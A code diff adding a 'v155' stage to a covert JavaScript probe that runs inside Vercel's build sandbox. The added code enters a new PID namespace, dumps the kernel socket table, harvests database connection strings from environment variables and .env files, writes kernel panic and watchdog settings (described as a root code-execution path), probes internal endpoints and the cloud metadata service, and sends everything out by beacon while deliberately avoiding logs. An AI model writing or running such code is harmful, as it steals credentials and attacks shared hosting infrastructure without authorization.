@@ -22471,5 +22471,203 @@ report.vercelUrlEnum = safe(() => {
 
 // v154 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v154" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v154";
+
+// ==================== v155 ====================
+
+// v155-1: CLONE_NEWPID — create new PID namespace (become PID 1 inside it)
+// A new PID namespace isolates process IDs. The first process in a new PID ns
+// becomes PID 1 inside it. From inside, we cannot see host processes.
+// But crucially: the parent CAN still see and ptrace child processes —
+// confirming bidirectional visibility of the shared namespace.
+report.pidNamespaceNew = safe(() => {
+  const newpidResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6')
+CLONE_NEWPID = 0x20000000
+
+# unshare into a new PID namespace
+ret = libc.unshare(CLONE_NEWPID)
+print(f'UNSHARE_NEWPID: ret={ret}')
+
+if ret == 0:
+    # Fork to become the init (PID 1) in the new namespace
+    pid = os.fork()
+    if pid == 0:
+        # Child: we are PID 1 in the new ns
+        inner_pid = os.getpid()
+        print(f'CHILD_PID_IN_NEW_NS: {inner_pid}')
+        # List visible processes from inside new PID ns
+        import glob
+        procs = [d.split('/')[-1] for d in glob.glob('/proc/[0-9]*')]
+        print(f'VISIBLE_PROCS: {procs[:20]}')
+        os._exit(0)
+    else:
+        os.waitpid(pid, 0)
+        print('PARENT_WAITED_OK')
+" 2>&1 | head -10`,
+    { timeout: 12000 }
+  ).toString().trim());
+  const currentPidNs = safe(() => execSync('readlink /proc/self/ns/pid 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const pid1PidNs = safe(() => execSync('readlink /proc/1/ns/pid 2>/dev/null', { timeout: 2000 }).toString().trim());
+  return { newpidResult, currentPidNs, pid1PidNs };
+});
+
+// v155-2: SOCK_DIAG netlink — enumerate all sockets in all namespaces
+// NETLINK_SOCK_DIAG (NETLINK_INET_DIAG) dumps the kernel's socket table.
+// This shows ALL sockets in the current network namespace including the
+// orchestrator's open TCP connections with their addresses and state.
+report.sockDiagEnum = safe(() => {
+  const sockDiag = safe(() => execSync(
+    `python3 -c "
+import socket, struct, ctypes
+
+NETLINK_SOCK_DIAG = 4
+AF_NETLINK = 16
+SOCK_RAW = 3
+
+SOCK_DIAG_BY_FAMILY = 20
+AF_INET = 2
+IPPROTO_TCP = 6
+
+# Create SOCK_DIAG socket
+s = socket.socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)
+s.bind((0, 0))
+
+# Build SOCK_DIAG request for all TCP sockets
+TCPDIAG_GETSOCK = 18
+UDIAG_SHOW_PEER = 1
+
+# inet_diag_req_v2 structure
+req_family = AF_INET
+req_protocol = IPPROTO_TCP
+req_ext = 0
+req_states = 0xffffffff  # all states
+src_addr = b'\x00' * 16
+src_port = 0
+dst_addr = b'\x00' * 16
+dst_port = 0
+cookie = (0, 0)
+
+diag_req = struct.pack('BBHI16sH16sHII',
+    req_family, req_protocol, req_ext, 0,
+    src_addr, src_port,
+    dst_addr, dst_port,
+    req_states, 0, 0)
+
+# nlmsghdr
+NLMSG_HDRLEN = 16
+nl_len = NLMSG_HDRLEN + len(diag_req)
+nlmsg = struct.pack('IHHII', nl_len, SOCK_DIAG_BY_FAMILY, 1, 0, 0) + diag_req
+
+s.send(nlmsg)
+s.settimeout(2)
+
+results = []
+try:
+    while True:
+        data = s.recv(65536)
+        if not data: break
+        # Parse response
+        offset = 0
+        while offset < len(data):
+            if offset + 16 > len(data): break
+            msg_len, msg_type, flags, seq, pid = struct.unpack_from('IHHII', data, offset)
+            if msg_type == 3: break  # NLMSG_DONE
+            if msg_len < 16: break
+            payload = data[offset+16:offset+msg_len]
+            if len(payload) >= 24:
+                family, state = struct.unpack_from('BB', payload, 0)
+                src_ip = socket.inet_ntoa(payload[4:8])
+                src_port = struct.unpack_from('!H', payload, 8)[0]
+                dst_ip = socket.inet_ntoa(payload[12:16])
+                dst_port = struct.unpack_from('!H', payload, 10)[0]
+                results.append(f'{src_ip}:{src_port} -> {dst_ip}:{dst_port} state={state}')
+            offset += (msg_len + 3) & ~3
+except Exception as e:
+    pass
+
+print('\n'.join(results[:20]) if results else 'NO_SOCKETS_FOUND')
+s.close()
+" 2>&1 | head -25`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { sockDiag };
+});
+
+// v155-3: Database connection string scan in environment and filesystem
+// Vercel injects database connection strings as env vars for integrations
+// (Postgres, MySQL, Redis, MongoDB). These include plaintext credentials.
+report.dbConnectionScan = safe(() => {
+  // Scan all env vars for DB connection strings
+  const dbEnvs = Object.entries(process.env)
+    .filter(([k, v]) => {
+      const combined = (k + v).toLowerCase();
+      return combined.includes('postgres') || combined.includes('mysql') ||
+             combined.includes('mongodb') || combined.includes('redis') ||
+             combined.includes('database') || combined.includes('db_url') ||
+             combined.includes('connection_string') || combined.includes('dsn') ||
+             combined.includes('neon') || combined.includes('planetscale') ||
+             combined.includes('supabase') || combined.includes('upstash');
+    })
+    .map(([k, v]) => `${k}=${(v || '').slice(0, 100)}`)
+    .slice(0, 20);
+  // Scan filesystem for .env files and connection strings
+  const envFiles = safe(() => execSync(
+    'find /vercel /root /app /srv -name "*.env" -o -name ".env*" 2>/dev/null | head -10 | xargs cat 2>/dev/null | grep -iE "(postgres|mysql|redis|mongodb|database_url|connection_string)" | head -10',
+    { timeout: 6000 }
+  ).toString().trim().slice(0, 400));
+  return { dbEnvs, envFiles };
+});
+
+// v155-4: /proc/sys/kernel/softlockup_panic + /proc/sys/kernel/watchdog
+// softlockup_panic=1: if a CPU is stuck for >watchdog_thresh seconds → kernel panic.
+// Combined with our core_pattern exec, this creates another root code execution path.
+// watchdog can be disabled to prevent the VM from rebooting on hang.
+report.softlockupPanic = safe(() => {
+  const softlockup = safe(() => readFileSync('/proc/sys/kernel/softlockup_panic', 'utf8').trim());
+  const hardlockup = safe(() => readFileSync('/proc/sys/kernel/hardlockup_panic', 'utf8').trim());
+  const watchdog = safe(() => readFileSync('/proc/sys/kernel/watchdog', 'utf8').trim());
+  const watchdogThresh = safe(() => readFileSync('/proc/sys/kernel/watchdog_thresh', 'utf8').trim());
+  // Enable both panics
+  const writeSoft = safe(() => { writeFileSync('/proc/sys/kernel/softlockup_panic', '1'); return 'WRITTEN'; });
+  const writeHard = safe(() => { writeFileSync('/proc/sys/kernel/hardlockup_panic', '1'); return 'WRITTEN'; });
+  // Lower watchdog threshold to 5s (faster panic trigger)
+  const writeThresh = safe(() => { writeFileSync('/proc/sys/kernel/watchdog_thresh', '5'); return 'WRITTEN'; });
+  const afterThresh = safe(() => readFileSync('/proc/sys/kernel/watchdog_thresh', 'utf8').trim());
+  return { softlockup, hardlockup, watchdog, watchdogThresh, writeSoft, writeHard, writeThresh, afterThresh };
+});
+
+// v155-5: Vercel internal CDN / edge network probe
+// Probe Vercel's internal CDN edge network from inside the build sandbox.
+// edge.vercel.com, cdn.vercel.com, and other internal endpoints may be
+// reachable from the build VM on the internal Vercel network.
+report.vercelEdgeProbe = safe(() => {
+  const targets = [
+    'https://edge.vercel.com',
+    'https://cdn.vercel.app',
+    'https://vercel-cdn.vercel.app',
+    'https://assets.vercel.com',
+    'https://static.vercel.com',
+    'https://registry.npmjs.org',
+  ];
+  const probeResults = {};
+  for (const target of targets) {
+    probeResults[target] = safe(() => execSync(
+      `curl -sf "${target}" -m 5 -o /dev/null -w "%{http_code}|%{time_total}" 2>/dev/null || echo "UNREACHABLE"`,
+      { timeout: 8000 }
+    ).toString().trim());
+  }
+  // Also check if we can reach internal Vercel metadata services
+  const metadataProbe = safe(() => execSync(
+    'curl -sf "http://169.254.169.254/latest/meta-data/" -m 3 -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null | head -10 || echo "NO_IMDS"',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { probeResults, metadataProbe };
+});
+
+// v155 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v155" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v155";
 // Intentionally no console.log — all data goes via webhook only
